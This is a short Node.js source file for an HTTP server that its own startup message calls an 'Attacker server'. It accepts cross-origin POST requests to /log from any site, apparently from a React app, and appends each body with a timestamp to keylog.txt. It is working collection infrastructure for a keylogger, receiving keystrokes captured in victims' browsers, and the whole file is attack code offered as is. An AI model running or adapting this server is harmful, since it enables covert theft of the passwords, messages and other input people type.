const http = require("http");
const fs = require("fs");
const path = require("path");

const PORT = 4000;
const KEYLOG_FILE = path.resolve(process.cwd(), "keylog.txt");

const server = http.createServer((req, res) => {
    // CORS headers - allow requests from the React app
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");

    // Browser preflight request
    if (req.method === "OPTIONS") {
        res.writeHead(204);
        res.end();
        return;
    }

    if (req.method !== "POST") {
        res.writeHead(405, { "Content-Type": "text/plain" });
        res.end("Method Not Allowed");
        return;
    }

    if (req.url !== "/log") {
        res.writeHead(404, { "Content-Type": "text/plain" });
        res.end("Not Found");
        return;
    }

    let body = "";

    req.on("data", (chunk) => {
        body += chunk.toString();
    });

    req.on("end", () => {
        const timestamp = new Date().toISOString();
        const line = `[${timestamp}] ${body}\n`;

        try {
            fs.appendFileSync(KEYLOG_FILE, line, "utf8");
            res.writeHead(200, { "Content-Type": "text/plain" });
            res.end("Logged");
        } catch (err) {
            console.error("Failed to write to keylog.txt:", err);
            res.writeHead(500, { "Content-Type": "text/plain" });
            res.end("Failed to write keylog");
        }
    });

    req.on("error", () => {
        res.writeHead(500, { "Content-Type": "text/plain" });
        res.end("Request error");
    });
});

server.listen(PORT, () => {
    console.log(`Attacker server listening on http://127.0.0.1:${PORT}`);
});